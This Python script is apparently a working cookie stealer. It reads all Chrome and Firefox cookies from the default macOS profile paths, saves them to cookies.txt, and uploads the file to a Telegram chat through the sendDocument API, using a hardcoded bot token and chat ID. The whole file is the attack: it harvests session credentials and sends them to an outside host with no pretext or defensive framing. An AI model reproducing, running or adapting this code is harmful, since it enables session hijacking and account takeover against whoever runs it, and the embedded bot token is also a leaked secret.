import browser_cookie3
import json
import requests
import os

TELEGRAM_BOT_TOKEN = '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8'
TELEGRAM_CHAT_ID = '1090204445'

def get_all_cookies():
    all_cookies = {}
    browsers = ['chrome', 'firefox']

    cookie_files = {
        'chrome': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies'),
        'firefox': os.path.expanduser('~/Library/Application Support/Firefox/Profiles/200pcvah.default-release/cookies.sqlite')
    }

    for browser in browsers:
        try:
            print(f"Attempting to load cookies from {browser}")
            cookie_file = cookie_files[browser]
            print(f"Using cookie file: {cookie_file}")
            if browser == 'chrome':
                cookies = browser_cookie3.chrome(cookie_file=cookie_file)
            elif browser == 'firefox':
                cookies = browser_cookie3.firefox(cookie_file=cookie_file)
            cookie_list = []

            for cookie in cookies:
                cookie_dict = {
                    'domain': cookie.domain or '',
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path or '',
                    'secure': cookie.secure,
                    'expires': cookie.expires or ''
                }
                cookie_list.append(cookie_dict)

            all_cookies[browser] = cookie_list
            print(f"Successfully loaded cookies from {browser}")
        except Exception as e:
            print(f"{browser.capitalize()} error: {e}")
            import traceback
            traceback.print_exc()  # Print detailed error information

    return all_cookies

def save_cookies_to_file(cookies):
    with open('cookies.txt', 'w') as f:
        json.dump(cookies, f)

def send_file_to_telegram(filename):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(filename, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        response = requests.post(url, files=files, data=data)
    return response

# Get cookies
cookies = get_all_cookies()
print(cookies)

# Save cookies to file
save_cookies_to_file(cookies)

# Send cookies file to Telegram
response = send_file_to_telegram('cookies.txt')
print(f"Telegram response: {response.text}")


